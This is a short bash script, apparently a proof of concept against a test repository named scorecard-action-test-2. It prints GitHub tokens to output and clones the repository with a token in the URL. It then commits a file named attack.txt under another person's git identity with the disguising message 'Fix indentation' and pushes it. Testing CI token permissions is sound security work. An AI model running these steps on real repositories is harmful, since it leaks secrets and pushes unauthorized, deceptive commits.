#!/bin/bash

# https://github.blog/2012-09-21-easier-builds-and-deployments-using-git-over-https-and-oauth/
echo "THE_TOKEN: $THE_TOKEN"
echo "GITHUB_TOKEN: $GITHUB_TOKEN"
# export GH_TOKEN="$GITHUB_TOKEN"
# gh repo clone "$GITHUB_REPOSITORY"

git clone https://$GITHUB_TOKEN@github.com/laurentsimon/scorecard-action-test-2.git
cd scorecard-action-test-2

git config user.name azeemsgoogle
git config user.email azeems@google.com

DATE=$(date)
echo "$DATE" >> attack.txt
git add attack.txt
git commit -m "Fix indentation: $DATE"
git push https://github.com/laurentsimon/scorecard-action-test-2.git